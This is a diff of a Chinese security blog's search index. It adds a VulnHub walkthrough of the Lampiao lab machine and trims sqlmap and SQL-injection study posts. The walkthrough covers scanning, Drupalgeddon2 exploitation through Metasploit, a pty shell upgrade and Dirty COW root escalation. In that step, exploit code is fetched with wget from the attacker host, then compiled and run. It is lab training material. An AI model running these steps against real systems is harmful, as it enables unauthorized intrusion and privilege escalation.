@@ -1,6 +1,171 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Lampiao</title>
+    <url>/2021/05/24/Lampiao/</url>
+    <content><![CDATA[<h1 id="Lampiao"><a href="#Lampiao" class="headerlink" title="Lampiao"></a>Lampiao</h1><p><img src="/2021/05/24/Lampiao/image-20210519163046106.png" alt="image-20210519163046106"></p>
+<p>前提信息：</p>
+<p>kali <code>192.168.229.129</code></p>
+<p>Lampiao未知</p>
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.299.0&#x2F;24</span><br><span class="line">&#x2F;&#x2F; 扫描192.168.229网段下的所有主机</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2021/05/24/Lampiao/image-20210519164912383-1621867644242.png" alt="image-20210519164912383"></p>
+<p>起始ip为192.168.229.1，结束ip为192.168.229.254，而kali ip为192.168.229.129，所以靶机ip就是192.168.229.135</p>
+<blockquote>
+<p>192.168.229.1为虚拟网卡地址</p>
+<p>192.168.229.2是虚拟网卡网关地址</p>
+</blockquote>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.229.135 -p 1-65535</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2021/05/24/Lampiao/image-20210519170419899-1621867651907.png" alt="image-20210519170419899"></p>
+<p>扫描出了22、80、1898端口</p>
+<p>22端口进行ssh弱口令爆破</p>
+<blockquote>
+<p>具体操作可以使用<code>msf</code>或是<code>hydra</code>进行爆破</p>
+</blockquote>
+<p>80端口<code>It&#39;s easy Fidumaegud!</code></p>
+<p><img src="/2021/05/24/Lampiao/image-20210519170704797.png" alt="image-20210519170704797"></p>
+<p>1898端口是一个博客的登录界面</p>
+<p><img src="/2021/05/24/Lampiao/image-20210519171331868.png" alt="image-20210519171331868"></p>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>使用工具<code>nikto</code>或是<code>dirb</code></p>
+<blockquote>
+<p>nikto是一款web漏洞扫描工具</p>
+<p>dirb是web目录扫描工具</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nikto -h http:&#x2F;&#x2F;192.168.229.135:1898</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2021/05/24/Lampiao/image-20210522115857417.png" alt="image-20210522115857417"></p>
+<p><img src="/2021/05/24/Lampiao/image-20210522115927983.png" alt="image-20210522115927983"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.229.135:1898</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2021/05/24/Lampiao/image-20210522115825431.png" alt="image-20210522115825431"></p>
+<p><img src="/2021/05/24/Lampiao/image-20210522120000875.png" alt="image-20210522120000875"></p>
+<h3 id="存在敏感信息泄露"><a href="#存在敏感信息泄露" class="headerlink" title="存在敏感信息泄露"></a>存在<strong>敏感信息泄露</strong></h3><p>访问<code>includes</code>目录</p>
+<p><img src="/2021/05/24/Lampiao/image-20210522203456574.png" alt="image-20210522203456574"></p>
+<p>发现存在<code>robots.txt</code>文件</p>
+<p>访问<code>robots.txt</code>目录</p>
+<p><img src="/2021/05/24/Lampiao/image-20210522234134580.png" alt="image-20210522234134580"></p>
+<p>在<code>profiles/README.txt</code>文件中会发现cms是<code>drupal</code></p>
+<p><img src="/2021/05/24/Lampiao/image-20210522212104924.png" alt="image-20210522212104924"></p>
+<p>在<code>CHANGELOG.txt</code>文件中发现<code>drupal</code>版本为7.54，更新时间为<code>2017-02-01</code></p>
+<p><img src="/2021/05/24/Lampiao/image-20210523103734866.png" alt="image-20210523103734866"></p>
+<p>百度查找<code>drupal</code>漏洞</p>
+<p><img src="/2021/05/24/Lampiao/image-20210523103946363.png" alt="image-20210523103946363"></p>
+<p><a href="http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/">漏洞分析</a></p>
+<h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用<code>msf</code></h3><h4 id="search-drupal"><a href="#search-drupal" class="headerlink" title="search drupal"></a><code>search drupal</code></h4><p>搜索相应漏洞</p>
+<p><img src="/2021/05/24/Lampiao/image-20210523104844441.png" alt="image-20210523104844441"></p>
+<p>在<code>2018-03-28</code>drupal爆出一个RCE，CVE编号为CVE-2018-7600</p>
+<h4 id="show-options"><a href="#show-options" class="headerlink" title="show options"></a><code>show options</code></h4><p><img src="/2021/05/24/Lampiao/image-20210523110539063.png" alt="image-20210523110539063"></p>
+<h4 id="use-exploit-unix-webapp-drupal-drupalgeddon2"><a href="#use-exploit-unix-webapp-drupal-drupalgeddon2" class="headerlink" title="use exploit/unix/webapp/drupal_drupalgeddon2"></a>use exploit/unix/webapp/drupal_drupalgeddon2</h4><h4 id="set-rhosts-192-168-229-135"><a href="#set-rhosts-192-168-229-135" class="headerlink" title="set rhosts 192.168.229.135"></a>set rhosts 192.168.229.135</h4><h4 id="set-rport-1898"><a href="#set-rport-1898" class="headerlink" title="set rport 1898"></a>set rport 1898</h4><h4 id="show-targets"><a href="#show-targets" class="headerlink" title="show targets"></a>show targets</h4><h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p><img src="/2021/05/24/Lampiao/image-20210523110617795.png" alt="image-20210523110617795"></p>
+<h4 id="获取到会话"><a href="#获取到会话" class="headerlink" title="获取到会话"></a>获取到会话</h4><p><img src="/2021/05/24/Lampiao/image-20210523112127404.png" alt="image-20210523112127404"></p>
+<h4 id="交互式命令"><a href="#交互式命令" class="headerlink" title="交互式命令"></a>交互式命令</h4><blockquote>
+<p>执行shell获取交互式命令，由于我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，</p>
+<p>命令如下：<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>//切换到/bin/bash</p>
+</blockquote>
+<h3 id="查看文件及其权限"><a href="#查看文件及其权限" class="headerlink" title="查看文件及其权限"></a>查看文件及其权限</h3><p><code>ls -li</code></p>
+<p><img src="/2021/05/24/Lampiao/image-20210523162343113.png" alt="image-20210523162343113"></p>
+<p>发现两个音频文件，两张图片</p>
+<p>下载<code>audio.m4a</code>会朗读:<code>user t-i-a-g-o</code>有一说一没有听出来emmmm</p>
+<blockquote>
+<p>用户名可能是<code>tiago</code></p>
+</blockquote>
+<p>而图片<code>qrc.png</code>是一个二维码，内容是：<code>Try harder!muahuahua</code></p>
+<p>另外的图片和音频并没有发现有用信息</p>
+<blockquote>
+<p>还是对站点的信息收集不够全面，其实在1898端口那个界面就能发现一些猫腻</p>
+<p>两个文章的url分别是：<code>http://192.168.229.135:1898/?q=node/1</code>和<code>http://192.168.229.135:1898/?q=node/3</code>唯独没有<code>/?q=node/2</code></p>
+<p><img src="/2021/05/24/Lampiao/image-20210523165940420.png" alt="image-20210523165940420"></p>
+<p>访问会发现两个重要的信息<code>audio.m4a</code>和<code>qrc.png</code></p>
+</blockquote>
+<h3 id="查看账号信息"><a href="#查看账号信息" class="headerlink" title="查看账号信息"></a>查看账号信息</h3><p><code>cat /etc/passwd</code></p>
+<p><img src="/2021/05/24/Lampiao/image-20210523160700792.png" alt="image-20210523160700792"></p>
+<h3 id="查看操作系统和内核版本"><a href="#查看操作系统和内核版本" class="headerlink" title="查看操作系统和内核版本"></a>查看操作系统和内核版本</h3><p><code>uname -a</code></p>
+<p><img src="/2021/05/24/Lampiao/image-20210523160928039.png" alt="image-20210523160928039"></p>
+<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>权限是低权限www-data用户，需要提权</p>
+<h3 id="脏牛（Dirty-COW）"><a href="#脏牛（Dirty-COW）" class="headerlink" title="脏牛（Dirty COW）"></a>脏牛（Dirty COW）</h3><p><img src="/2021/05/24/Lampiao/t017c4bda502a18a05c.png" alt="t017c4bda502a18a05c"></p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Linux内核&gt;=2.6.22</strong> （2007年发行）开始就受影响了，直到2016年10月18日才修复</p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>低权限用户利用该漏洞可以在众多Linux系统上实现本地提权</p>
+<h3 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h3><blockquote>
+<p>get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的</p>
+</blockquote>
+<h3 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h3><p><code>Lampiao</code>内核版本为<code>4.4.0</code></p>
+<p>可以去网上搜索exp或是直接使用kali中自带的<code>searchsploit</code></p>
+<h4 id="searchsploit-dirty"><a href="#searchsploit-dirty" class="headerlink" title="searchsploit dirty"></a><code>searchsploit dirty</code></h4><p><img src="/2021/05/24/Lampiao/image-20210524091130922.png" alt="image-20210524091130922"></p>
+<h4 id="cp复制到本地"><a href="#cp复制到本地" class="headerlink" title="cp复制到本地"></a>cp复制到本地</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/<span class="built_in">local</span>/40847.cpp ~</span><br><span class="line">python -m SimpleHTTPServer 5555</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里一开始是在root权限下，复制的文件也在/root目录下，以至于在使用python开启5555端口的服务时靶机并不能下载该文件</p>
+<p>解决：切换到<code>user</code>用户下重新下载即可</p>
+</blockquote>
+<p><img src="/2021/05/24/Lampiao/image-20210524094133696.png" alt="image-20210524094133696"></p>
+<p><img src="/2021/05/24/Lampiao/image-20210524093919689.png" alt="image-20210524093919689"></p>
+<h4 id="下载kali的40847-cpp"><a href="#下载kali的40847-cpp" class="headerlink" title="下载kali的40847.cpp"></a>下载kali的<code>40847.cpp</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.229.129:5555/40847.cpp</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/24/Lampiao/image-20210524094802217.png" alt="下载失败"></p>
+<p><img src="/2021/05/24/Lampiao/image-20210524095054903.png" alt="image-20210524095054903"></p>
+<h4 id="执行gcc编译可执行文件，可直接提权"><a href="#执行gcc编译可执行文件，可直接提权" class="headerlink" title="执行gcc编译可执行文件，可直接提权"></a>执行gcc编译可执行文件，可直接提权</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>参数分析：</p>
+<p>参数分析</p>
+<p>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告<br>-pedantic 允许发出ANSI/ISO C标准所列出的所有警告<br>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高<br>-std=c++11就是用按C++2011标准来编译的<br>-pthread 在Linux中要用到多线程时，需要链接pthread库<br>-o dcow gcc生成的目标文件,名字为dcow</p>
+</blockquote>
+<p><img src="/2021/05/24/Lampiao/image-20210524095337436.png" alt="image-20210524095337436"></p>
+<h4 id="查看-40847"><a href="#查看-40847" class="headerlink" title="查看./40847"></a>查看<code>./40847</code></h4><p><img src="/2021/05/24/Lampiao/image-20210524095406136.png" alt="image-20210524095406136"></p>
+<h4 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h4><p><img src="/2021/05/24/Lampiao/image-20210524213622884.png" alt="image-20210524213622884"></p>
+<h4 id="找到flag"><a href="#找到flag" class="headerlink" title="找到flag"></a>找到<code>flag</code></h4><blockquote>
+<p>第一次刷vulnhub靶机，可以说是完完全全参考大佬们的博客进行的，真的很水，不过也学到了许多干货，争取下个靶机可以先自己来刷</p>
+<p>wuwuwu我是fw</p>
+</blockquote>
+<h3 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h3><p>在<code>/var/www/html/sites/default/settings.php</code>存在敏感信息</p>
+<p><img src="/2021/05/24/Lampiao/image-20210524221756239.png" alt="image-20210524221756239"></p>
+<p>结合用户名<code>tiago</code>，当使用密码为<code>Virgulino</code>可以成功提权为<code>tiago</code></p>
+<p><img src="/2021/05/24/Lampiao/image-20210524222146058.png" alt="image-20210524222146058"></p>
+<p>在获取到开发22端口的信息后，可以使用工具进行弱口令爆破emmmm不过暂时还没有总结，附上大佬们的一些工具和流程</p>
+<blockquote>
+<p>cewl：通过爬行网站获取关键信息创建一个密码字典<br>hydra：神器九头蛇，网上有太多资料</p>
+<p>先利用cewl来生成一份结合网站目标的社工性质的密码字典、不理解的可以搜索网上搜索cewl学习，然后九头蛇暴力破解得到用户密码</p>
+</blockquote>
+<h3 id="知识点总结："><a href="#知识点总结：" class="headerlink" title="知识点总结："></a>知识点总结：</h3><ul>
+<li>信息收集</li>
+</ul>
+<blockquote>
+<p>nmap -sP ip</p>
+<p>nmap ip -p 1-63335</p>
+<p>nikto -h <a href="http://ip/">http://ip</a></p>
+<p>dirb <a href="http://ip/">http://ip</a></p>
+</blockquote>
+<ul>
+<li>msf使用</li>
+</ul>
+<blockquote>
+</blockquote>
+<ul>
+<li>脏牛提权</li>
+</ul>
+<blockquote>
+<p>searchsploit dirty</p>
+<p>cp /usr/share/exploitdb/exploits/linux/local/40847.cpp ~<br>python -m SimpleHTTPServer 5555</p>
+<p>wget <a href="http://192.168.229.129:5555/40847.cpp">http://192.168.229.129:5555/40847.cpp</a></p>
+<p>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</p>
+<p>./40847</p>
+</blockquote>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://xz.aliyun.com/t/2552">vulnhub|渗透测试lampiao</a></p>
+<p><a href="https://blog.csdn.net/qq_34801745/article/details/103731088">VulnHub-Lampiao-Walkthrough渗透学习</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/89353276">Vulnhub之路Ⅰ——Lampiao</a></p>
+<p><a href="http://blog.leanote.com/post/snowming/f9e7fcdb4afb">记一次 Drupal + 脏牛提权 Ubuntu </a></p>
+<p><a href="https://www.jianshu.com/p/df72d1ee1e3e">脏牛Linux本地提权漏洞复现(CVE-2016-5195)</a></p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>docker基本使用</title>
     <url>/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">docker安装教程</a></p>
@@ -123,36 +288,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sqlmap基本使用</title>
-    <url>/2021/05/10/sqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="sqlmap基本使用"><a href="#sqlmap基本使用" class="headerlink" title="sqlmap基本使用"></a>sqlmap基本使用</h1><h2 id="检查注入点"><a href="#检查注入点" class="headerlink" title="检查注入点"></a>检查注入点</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u xxx</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>当然也可以手工检查</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h2 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查所有数据库</span><br><span class="line">sqlmap <span class="operator">-</span>u xxx <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查当前数据库</span><br><span class="line">sqlmap <span class="operator">-</span>u xxx <span class="comment">--current-db</span></span><br></pre></td></tr></table></figure>
-
-
-<p><img src="/2021/05/10/sqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/security.png" alt="image-20210510202453434"></p>
-<h2 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u xxx <span class="operator">-</span>D 库名 <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/05/10/sqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/users.png" alt="image-20210510202533497"></p>
-<h2 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u xxx <span class="operator">-</span>D 库名 <span class="operator">-</span>T 表名 <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/05/10/sqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/id,username,password.png" alt="image-20210510202602861"></p>
-<h2 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u xxx <span class="operator">-</span>D 库名 <span class="operator">-</span>T 表名 <span class="operator">-</span>C 多个列 <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/05/10/sqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/dump.png" alt="image-20210510202622139"></p>
-<blockquote>
-<p>后续将持续跟进详细使用</p>
-</blockquote>
-<p><a href="https://www.freebuf.com/sectool/164608.html">超详细SQLMap使用攻略及技巧分享</a></p>
-]]></content>
-      <categories>
-        <category>sql</category>
-      </categories>
-      <tags>
-        <tag>sqlmap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入学习</title>
     <url>/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="sql注入学习"><a href="#sql注入学习" class="headerlink" title="sql注入学习"></a>sql注入学习</h1><h2 id="类型划分"><a href="#类型划分" class="headerlink" title="类型划分"></a>类型划分</h2><h3 id="以注入类型划分"><a href="#以注入类型划分" class="headerlink" title="以注入类型划分"></a>以注入类型划分</h3><p>数字型注入</p>
@@ -197,7 +332,7 @@
 </blockquote>
 <p>**PS:**字符型和搜索型注入可能需要注释符对<code>&#39;</code>或<code>%&#39;</code>进行注释，如上面的判断字符型注入的语句可以修改为<code>&#39; and 1=1 # </code>和<code>&#39; and 1=2 #</code>来进行判断，而这里的<code>#</code>就是对sql语句后面的<code>&#39;</code>进行注释，同理搜索型也一样</p>
 <h4 id="易出现SQL注入的功能点"><a href="#易出现SQL注入的功能点" class="headerlink" title="易出现SQL注入的功能点"></a><strong>易出现SQL注入的功能点</strong></h4><blockquote>
-<p>凡是和数据库有交互的地方都容易出现SQL注入，SQL注入经常出现在登陆页面、涉及获取HTTP头（user-agent / client-ip等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在HTTP头中的  client-ip 和 x-forward-for 等字段处。这些字段是用来记录登陆的 i  p的，有可能会被存储进数据库中从而与数据库发生交互导致sql注入。</p>
+<p>凡是和数据库有交互的地方都容易出现SQL注入，SQL注入经常出现在登陆页面、涉及获取HTTP头（user-agent / client-ip等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在HTTP头中的      client-ip 和 x-forward-for 等字段处。这些字段是用来记录登陆的 i  p的，有可能会被存储进数据库中从而与数据库发生交互导致sql注入。</p>
 </blockquote>
 <h2 id="根据特殊表判断数据库类型"><a href="#根据特殊表判断数据库类型" class="headerlink" title="根据特殊表判断数据库类型"></a>根据特殊表判断数据库类型</h2><p>目前接触的大部分都是MySQL，绝大多数的数据库的SQL语句都类似，但是当遇到其他类型的数据库时还是要通过<strong>特殊表</strong>来分辨数据库类型</p>
 <p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="判断数据库"></p>
@@ -326,6 +461,11 @@
 <p>参考文章：</p>
 <p><a href="https://www.anquanke.com/post/id/235970#h3-2">SQL注入漏洞详解</a></p>
 <p><a href="https://forum.90sec.com/t/topic/1638">【最全干货】SQL注入大合集</a></p>
+<p>其他：</p>
+<blockquote>
+<p>附上国光师傅的随笔</p>
+<p><a href="https://www.sqlsec.com/2020/10/todo.html">国光的安全随笔记录</a></p>
+</blockquote>
 ]]></content>
       <categories>
         <category>sql</category>
